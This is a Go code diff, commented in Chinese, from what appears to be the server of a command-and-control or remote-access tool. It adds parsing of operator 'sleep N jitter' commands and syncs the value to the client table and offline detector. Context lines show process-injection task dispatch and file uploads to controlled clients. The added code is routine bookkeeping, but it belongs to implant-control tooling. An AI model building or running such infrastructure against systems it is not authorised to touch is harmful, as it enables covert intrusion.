@@ -193,6 +193,14 @@ func resolveCommand(uid, command string) (byteToSend []byte, send bool) {
 		return writeShellLine("inject task dispatched: pid=" + strconv.Itoa(pid) + " tech=" + tech)
 	}
 
+	// 运行期 sleep 同步「间隔」列：客户端心跳里带的是生成期 sleep（编译期占位符，
+	// CmdSleep 只改运行期 WaitTime，不回写），所以操作员改 sleep 后 UI 的「间隔」
+	// 不会自己变。在服务端下发时记一笔，UI 才与客户端真实节奏一致。
+	// （UI 睡眠对话框走 EditSleep，也会落到这里，重复写同值无副作用。）
+	if sec, ok := parseSleepCommand(command); ok {
+		syncClientSleepColumn(uid, sec)
+	}
+
 	// 精确命令（无参）
 	if typ, ok := exactCommands[command]; ok {
 		return buildCmd(typ, nil), true
@@ -507,4 +515,44 @@ func SendFileUploadCommandChecked(uid string, byteToSend []byte) error {
 // 分块全部丢失、调用方却拿到成功。现在统一走 sendByProtocolErr，真的发送并如实回报。
 func SendFileUploadCommandWithResult(uid string, byteToSend []byte) bool {
 	return SendFileUploadCommandChecked(uid, byteToSend) == nil
+}
+
+// parseSleepCommand 从 "sleep N [jitter]" 取出休眠秒数，按客户端 CmdSleep 一致的
+// 1-300s 钳制（两端钳制规则必须一致，否则 UI 显示的值与客户端实际值会分裂）。
+// 只认 "sleep " 开头的命令，避免把 "sleepy"-类的 shell 命令误判成休眠调整。
+func parseSleepCommand(command string) (int, bool) {
+	if !strings.HasPrefix(command, "sleep ") {
+		return 0, false
+	}
+	fields := strings.Fields(strings.TrimPrefix(command, "sleep "))
+	if len(fields) == 0 {
+		return 0, false
+	}
+	sec, err := strconv.Atoi(fields[0])
+	if err != nil {
+		return 0, false
+	}
+	if sec < 1 {
+		sec = 1
+	}
+	if sec > 300 {
+		sec = 300
+	}
+	return sec, true
+}
+
+// syncClientSleepColumn 把下发的休眠秒数写回客户端表与离线检测器。
+// 客户端不上报运行期 sleep（心跳里的 osInfo 是生成期占位符值），所以这里写的是
+// "服务端最后要求的值"——与 EditSleep 语义一致，是 UI「间隔」列的唯一运行期来源。
+func syncClientSleepColumn(uid string, sec int) {
+	normalized := strconv.Itoa(sec)
+	if database.DB() != nil {
+		if _, err := database.Clients_().UpdateColumns(uid, []string{"sleep"}, &database.Clients{Sleep: normalized}); err != nil {
+			logx.Warnf("⚠️ [SLEEP] 同步客户端 %s 的休眠列失败: %v\n", uid, err)
+		}
+	}
+	if connection.GlobalOfflineDetector != nil {
+		connection.GlobalOfflineDetector.UpdateSleep(uid, sec)
+	}
+	logx.Infof("💤 [SLEEP] 客户端 %s 休眠调整为 %ds（已同步「间隔」显示）\n", uid, sec)
 }
